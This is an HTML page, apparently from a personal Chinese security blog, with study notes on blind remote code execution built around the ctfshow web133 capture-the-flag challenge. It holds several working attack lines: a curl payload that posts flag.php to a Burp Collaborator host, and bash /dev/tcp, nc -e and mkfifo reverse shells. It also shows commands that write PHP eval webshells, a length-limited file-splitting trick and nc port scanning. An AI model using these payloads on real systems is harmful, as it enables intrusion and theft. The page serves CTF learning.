@@ -1,0 +1,582 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || RCE补充篇——无回显</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>哒哒哒哒哒~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>RCE补充篇——无回显 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/8/15
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于网络安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于网络安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/RCE" style=color:#879cff>
+                    RCE
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>遇到了没有回显的RCE呜呜呜</p>
+<span id="more"></span>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/119008895">一个看起来很全的RCE总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45557476/article/details/121882666">rce无回显剖析</a></p>
+<h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><ul>
+<li><p>无回显RCE就是：在命令执行的时候，虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行</p>
+</li>
+<li><pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$a=$_GET[&#39;a&#39;];
+exec(&quot;$a&quot;);
+//$b=exec(&quot;$a&quot;);
+//echo $b;
+</code></pre>
+</li>
+<li><p>可以使用sleep命令通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行：?a=1;sleep 5</p>
+</li>
+</ul>
+<p><strong>重温ctfshow web133第n次</strong></p>
+<p>花了好长时间弄了一个bp专业版、、、、、、、、、、、、、、、、、真的会谢dnslog为什么用不了</p>
+<blockquote>
+<pre><code class="php">error_reporting(0);
+highlight_file(__FILE__);
+//flag.php
+if($F = @$_GET[&#39;F&#39;])&#123;
+ if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $F))&#123;
+     eval(substr($F,0,6));
+ &#125;else&#123;
+     die(&quot;6个字母都还不够呀?!&quot;);
+ &#125;
+&#125;
+</code></pre>
+<ul>
+<li><p>限制只能执行六个字符的命令，但是如果传递的参数就是<code>$F</code>本身，会发生变量覆盖</p>
+</li>
+<li><p>此处抄一手出题人wp：</p>
+</li>
+<li><pre><code class="txt">我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令
+因为传递的`$F`;+sleep 3 先进行substr()函数截断然后去执行eval()函数,这个函数的作用是执行php代码
+``是shell_exec()函数的缩写，然后就去命令执行,而$F就是我们输入的`$F`;+sleep 3 
+所以最后执行的代码应该是``$F`;+sleep 3`,就执行成功
+</code></pre>
+</li>
+<li><pre><code class="txt"># payload 
+#其中-F 为带文件的形式发送post请求
+#xx是上传文件的name值，flag.php就是上传的文件 
+?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
+</code></pre>
+</li>
+<li><p>啊啊啊啊啊好激动！我终于终于终于成功了！！！</p>
+</li>
+</ul>
+<p>写个小总结吧：</p>
+<ul>
+<li><p>首先就是payload一开始传错了，是直接写到url里就可以的，然后是要去点第三个HTTP那个，然后可以看到flag.php的源码就找到flag了</p>
+</li>
+<li><p>其次就是对这个的原理实在不是很清楚，应该好好写写笔记好好了解一下</p>
+</li>
+<li><p>最后，关于那个杀千刀的dnslog，我早晚要弄明白它怎么回事儿</p>
+</li>
+</ul>
+</blockquote>
+<p>除去这个困扰我很久的web133，下面好好总结一下关于无回显RCE的其它姿势</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul>
+<li>因为虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令是执行了的，所以可以将shell反弹到自己服务器上，然后再执行命令就可以看到回显了</li>
+<li>据说：反弹shell都用的<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>这条命令，或者使用<code>nc</code>进行反弹：利用<code>nc -e /bin/sh ip port</code>进行反弹</li>
+</ul>
+<p><strong>下边把昨天翻到的大佬文章整理一下</strong></p>
+<ul>
+<li><p>关于Linux文件描述符</p>
+<blockquote>
+<p>Linux文件描述符可以理解为Linux跟踪打开文件而分配的一个数字</p>
+<ul>
+<li>当Linux启动的时候会默认打开三个文件描述符，分别是：<ul>
+<li>标准输入：standard input 0 （默认设备键盘）</li>
+<li>标准输出：standard output 1（默认设备显示器）</li>
+<li>错误输出：error output 2（默认设备显示器）</li>
+</ul>
+</li>
+<li>注意：<br>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符</li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于Linux下一切皆文件</p>
+<blockquote>
+<p>==从shell角度看：==</p>
+<ul>
+<li>shell是用户和Linux内核之间的接口程序，用户在提示符下输入的每个命令都由shell先解释后传给Linux内核</li>
+<li>shell是一个命令语言解释器，拥有自己内建的命令集；此外shell也能被系统中其它有效的实用程序和应用程序所调用，不论用户何时键入一个命令，它都Linux shell所解释：<ul>
+<li>shell 首先检查命令是否是内部命令，不是的话再检查是否是一个应用程序（这里的应用程序可以是Linux本身的实用程序）</li>
+<li>然后shell试着在搜索路径($PATH)里寻找这些应用程序——搜索路径是一个能找到可执行程序的目录列表</li>
+<li>如果你键入的命令不是一个内部命令并且在路径里没有找到这个可执行文件，将会显示一条错误信息</li>
+<li>而如果命令被成功的找到的话，shell的内部命令或应用程序将被分解为系统调用并传给Linux内核</li>
+</ul>
+</li>
+<li>shell的另一个重要特性是它自身就是一个解释型的程序设计语言</li>
+<li>BASH是SHELL的一种，是大多数LINUX发行版默认的SHELL，除BASH SHELL外还有C SHELL等其它类型的SHELL</li>
+<li>bash是sh的增强版本，在我们平常实地操作的时候如果sh这个命令不灵了我们应当使用bash</li>
+</ul>
+<p>==从port看：==</p>
+<ul>
+<li>/dev/tcp/ip/port是一个特殊的文件，可以将其看成一个设备，如果访问这个文件的位置是不存在的</li>
+<li>但是如果在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于多命令顺序执行</p>
+<blockquote>
+<p>判断命令是否报错 命令 &amp;&amp; echo yes || echo no命令正确打印yes命令错误打印no，其它的管道符啥的以前写过这里就不写了</p>
+</blockquote>
+</li>
+<li><p>关于find命令</p>
+<blockquote>
+<ul>
+<li><code>find /bin -name *sh | nc IP 8888</code>（这个题用到的命令）</li>
+<li>find –列出当前目录下的文件以及子目录所有文件</li>
+<li>想要在/etc目录中查找文件名以host开头的文件：<code>find /etc -name &quot;host*&quot; -print</code></li>
+<li>将当前目录及其子目录下所有文件后缀为 .c 的文件列出来：<code>find . -name &quot;*.c&quot;</code></li>
+<li>将当前目录及其子目录中的所有文件列出：<code>find . -type f</code></li>
+<li>将当前目录及其子目录下所有最近 20 天内更新过的文件列出：<code>find . -ctime -20</code></li>
+<li>查找 /var/log 目录中更改时间在 7 日以前的普通文件，并在删除之前询问它们：<code>find /var/log -type f -mtime +7 -ok rm &#123;&#125; ;</code></li>
+<li>想要查找$HOME目录中的文件：<code>find ~ -name &quot;*&quot; -print</code>或<code>find . -print</code></li>
+<li>根目录找所有文件<code>find / -name &quot;*&quot; -print1.</code></li>
+<li>输入重定向：&lt; file cat和cat &lt; file是一样的，因为 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了</li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于交互重定向</p>
+<blockquote>
+<ul>
+<li>bash -i &gt; /dev/tcp/ip/端口 0&gt;&amp;1 2&gt;&amp;1，为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上</li>
+<li>在受害者机器上输入bash -i &gt; /dev/tcp/ip/端口，但是攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行；还需要一条这样的指令：bash -i &lt; /dev/tcp/ip/端口</li>
+<li>现在需要将两条指令结合起来：bash -i &gt; /dev/tcp/ip/端口 0&gt;&amp;1，但是在受害者机器上能看到在攻击者机器中执行的指令 </li>
+<li>&amp;、&amp;&gt;这个符号作用就是混合输出（错误、正确输出都输出到一个地方）bash -i &gt; /dev/tcp/ip/端口 0&gt;&amp;1 2&gt;&amp;1 </li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于输出重定向</p>
+<blockquote>
+<ul>
+<li>格式：<code>[n]&gt; word</code>——将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于标准输出与标准错误输出重定向</p>
+<blockquote>
+<ul>
+<li>格式：<code>&amp;&gt; word</code>或<code>&gt;&amp; word</code></li>
+<li>格式说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的<br>执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。</li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于文件描述符的复制</p>
+<blockquote>
+<ul>
+<li><p>格式：<code>[n]&lt;&amp;[m] 或 [n]&gt;&amp;[m] </code>(所有字符之间不要有空格)</p>
+</li>
+<li><p>这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p>
+</li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于exec 绑定重定向</p>
+<blockquote>
+<ul>
+<li>格式：<code>exec [n] &lt; 或 &gt; file/[n]</code>——格式说明：输入输出重定向 将 输入和输出绑定文件或者设备 以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</li>
+<li>格式：<code>[n]&lt;&gt;word</code>——格式说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入</li>
+<li>&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</li>
+<li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向</li>
+<li>&lt;1&gt;输出重定向 &gt; &gt;&gt;，&lt;2&gt;输入重定向 &lt; &lt;&lt;</li>
+<li>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果需要让输出不显示在显示器上，而是输出到文件或者其他设备，那就需要重定向</li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于反弹shell的姿势和nc拓展</p>
+<blockquote>
+<ul>
+<li><p>正向连接</p>
+<ul>
+<li>正向反弹是靶机先执行nc命令，然后控制端上再进行nc监听，命令为：<code>nc -lvp 9999 -e /bin/bash</code>或者<code>nc -lvp 9999 -e cmd.exe</code></li>
+<li>控制端：<code>nc 靶机ip 9999</code></li>
+</ul>
+</li>
+<li><p>反向连接</p>
+<ul>
+<li><p>反向反弹是控制端执行监听命令，让靶机连接控制端</p>
+</li>
+<li><p>…</p>
+</li>
+</ul>
+</li>
+<li><p>bash方法（需要有nc）</p>
+<ul>
+<li>靶机：<code>nc 监听地址 监听端口 -e /bin/bash</code> 或<code>nc 监听地址 监听端口 -e cmd.exe</code></li>
+<li>控制端：<code>nc -lvp 监听端口</code></li>
+<li>如果没有-e 选项：<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip 端口 &gt;/tmp/f</code>，mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</li>
+</ul>
+</li>
+<li><p>sh方法</p>
+<ul>
+<li>靶机：<code>nc ip 端口 -e /bin/sh</code></li>
+<li>控制端：<code>nc -lvp 9999</code>，bash是sh的增强版，如果靶机中没有bash，那么bash不可以用但是sh可以用，因为虽然没有bash但是会有sh</li>
+</ul>
+</li>
+<li><p>bash</p>
+<ul>
+<li>靶机：<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1</code></li>
+<li>控制端：<code>nc -Lvp 9999</code></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+</li>
+<li><p>关于端口扫描</p>
+<blockquote>
+<ul>
+<li><code>nc -v ip port</code>指定端口</li>
+<li><code>nc -v -w ip -z 1-65536</code>指定端口范围</li>
+<li><code>nc -nvz 127.0.0.1 1-100</code>使用全链接方式扫描端口（TCP扫描）</li>
+<li><code>nc -nvzu 192.168.1.105 1-1024</code>udp扫描</li>
+<li><code>-v</code>输出详细报告</li>
+<li><code>-w timeou</code>t一个链接一段时间无操作，则自动断开，默认无超时</li>
+<li><code>-z</code>只监听不发送任何包</li>
+</ul>
+</blockquote>
+</li>
+<li><p>文件传输</p>
+<blockquote>
+<ul>
+<li><code>nc -l 8099 &gt;</code>要接受的文件名</li>
+<li><code>nc 目的IP 8099 &lt;</code>要发送的文件</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h3 id="dnslog外带数据法"><a href="#dnslog外带数据法" class="headerlink" title="dnslog外带数据法"></a>dnslog外带数据法</h3><ul>
+<li>目测这个方法的原理和用bp的原理是一样的</li>
+<li>如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析</li>
+<li>那么假如有一个可控的二级域名，那么当它向下一层域名发起解析的时候，就能拿到它的域名解析请求</li>
+<li>这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</li>
+<li>需要了解的一些命令：<ul>
+<li><code>sed</code>命令，可以实现对行的分：ls | sed -n ‘1p’  （显示第一行）</li>
+<li><code>find</code>命令：<ul>
+<li>-name：按名称查找；根据目标文件的名称进行查找，允许使用<code>*</code>及<code>?</code>通配符</li>
+<li>-size：按文件大小查找；一般使用<code>+</code>、<code>-</code>号设置超过或小于指定的大小作为查找条件，常用的容量单位包括kB（注意k是小写）、MB、GB；</li>
+<li>-user：按文件属主查找；</li>
+<li>-type：按文件类型查找；类型指的是普通文件（f）、目录（d）、块设备文件（b）、字符设备文件（c）等</li>
+</ul>
+</li>
+<li>关于<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ysuwangqiang/p/11364173.html#:~:text=Linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6.%20%E3%80%80%E3%80%80%E9%80%9A%E9%85%8D%E7%AC%A6%E6%98%AF%E7%94%B1shell%E5%A4%84%E7%90%86%E7%9A%84%2C%20%E5%AE%83%E5%8F%AA%E4%BC%9A%E5%87%BA%E7%8E%B0%E5%9C%A8%20%E5%91%BD%E4%BB%A4%E7%9A%84%E2%80%9C%E5%8F%82%E6%95%B0%E2%80%9D%E9%87%8C%E3%80%82.%20%E5%BD%93shell%E5%9C%A8%E2%80%9C%E5%8F%82%E6%95%B0%E2%80%9D%E4%B8%AD%E9%81%87%E5%88%B0%E4%BA%86%E9%80%9A%E9%85%8D%E7%AC%A6%E6%97%B6%EF%BC%8Cshell%E4%BC%9A%E5%B0%86%E5%85%B6%E5%BD%93%E4%BD%9C%E8%B7%AF%E5%BE%84%E6%88%96%E6%96%87%E4%BB%B6%E5%90%8D%E5%8E%BB%E5%9C%A8%E7%A3%81%E7%9B%98%E4%B8%8A%E6%90%9C%E5%AF%BB%E5%8F%AF%E8%83%BD%E7%9A%84%E5%8C%B9%E9%85%8D%EF%BC%9A%E8%8B%A5%E7%AC%A6%E5%90%88%E8%A6%81%E6%B1%82%E7%9A%84%E5%8C%B9%E9%85%8D%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%88%99%E8%BF%9B%E8%A1%8C%E4%BB%A3%E6%8D%A2%28%E8%B7%AF%E5%BE%84%E6%89%A9%E5%B1%95%29%EF%BC%9B%E5%90%A6%E5%88%99%E5%B0%B1%E5%B0%86%E8%AF%A5%E9%80%9A%E9%85%8D%E7%AC%A6%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E5%AD%97%E7%AC%A6%E4%BC%A0%E9%80%92%E7%BB%99%E2%80%9C%E5%91%BD%E4%BB%A4%E2%80%9D%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E7%94%B1%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%E3%80%82.%20%E6%80%BB%E4%B9%8B%EF%BC%8C%E9%80%9A%E9%85%8D%E7%AC%A6%20%E5%AE%9E%E9%99%85%E4%B8%8A%E5%B0%B1%E6%98%AF%E4%B8%80%E7%A7%8Dshell%E5%AE%9E%E7%8E%B0%E7%9A%84%E8%B7%AF%E5%BE%84%E6%89%A9%E5%B1%95%E5%8A%9F%E8%83%BD%E3%80%82.%20%E5%9C%A8,SHELL%E4%B8%AD%E7%9A%84%E9%80%9A%E9%85%8D%E7%AC%A6.%20%E5%B8%AE%E5%8A%A9%E6%89%8B%E5%86%8C%EF%BC%9A%23%20man%207%20glob%20.%20%E5%8C%B9%E9%85%8D%E4%BB%BB%E6%84%8F%E9%95%BF%E5%BA%A6%E7%9A%84%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%98%AF0%E4%B8%AA.%20%E5%8C%B9%E9%85%8D%E4%BB%BB%E6%84%8F%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%BF%85%E9%A1%BB%E6%98%AF1%E4%B8%AA.">Linux命令通配符</a>，有点正则的感觉</li>
+</ul>
+</li>
+</ul>
+<h3 id="其它一些很好用的方法"><a href="#其它一些很好用的方法" class="headerlink" title="其它一些很好用的方法"></a>其它一些很好用的方法</h3><ul>
+<li><p><strong>复制，压缩，写shell方法：</strong></p>
+<pre><code class="shell">copy flag.php flag.txt
+mv flag.php flag.txt
+cat flag.php &gt; flag.txt
+</code></pre>
+</li>
+<li><p><strong>压缩方法</strong></p>
+<pre><code class="shell">tar cvf flag.tar flag.php          #tar压缩
+tar zcvf flag.tar.gz flag.php      #tar解压
+zip flag.zip flag.php              #zip压缩
+unzip flag.zip                     #zip解压
+</code></pre>
+</li>
+<li><p><strong>写shell方法</strong></p>
+<pre><code class="shell">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php
+#(3c3f706870206576616c28245f504f53545b3132335d293b203f3e是&lt;?php eval($_POST[123]); ?&gt;的十六进制编码)
+echo &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php
+</code></pre>
+</li>
+<li><p><strong>linux tee命令</strong></p>
+<pre><code class="shell">#Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。
+tee file1 file2  #复制文件
+ls /|tee 1.txt   #命令输出
+</code></pre>
+</li>
+<li><p><strong>/dev/null 2&gt;&amp;1类无回显</strong></p>
+<pre><code class="shell">#/dev/null 2&gt;&amp;1的主要意思是不进行回显，进行命令分隔即可（如：system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);）
+cat flag.php||
+cat flag.php;
+</code></pre>
+</li>
+<li><p><strong>可输入长度被限制</strong></p>
+<blockquote>
+<ul>
+<li><p>linux的一些特性</p>
+<ul>
+<li><p>a 虽然没有输入但是会创建a这个文件</p>
+</li>
+<li><p>ls -t ls基于基于事件排序（从晚到早）</p>
+</li>
+<li><p>sh a sh会把a里面的每行内容当作命令来执行使用|进行命令拼接 #l\ s = ls</p>
+</li>
+<li><p>base64 使用base64编码避免特殊字符</p>
+</li>
+<li><p>可写：<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p>
+</li>
+<li><p>将语句拆分写入（最后两句是重点）：</p>
+</li>
+<li><pre><code class="shell">&gt;hp  &gt;1.p\\  &gt;d\&gt;\\  &gt;\ -\\  &gt;e64\\  &gt;bas\\  &gt;7\|\\  &gt;XSk\\  &gt;Fsx\\
+&gt;dFV\\  &gt;kX0\\  &gt;bCg\\  &gt;XZh\\  &gt;AgZ\\  &gt;waH\\  &gt;PD9\\  &gt;o\ \\  &gt;ech\\
+ls -t&gt;0
+sh 0
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
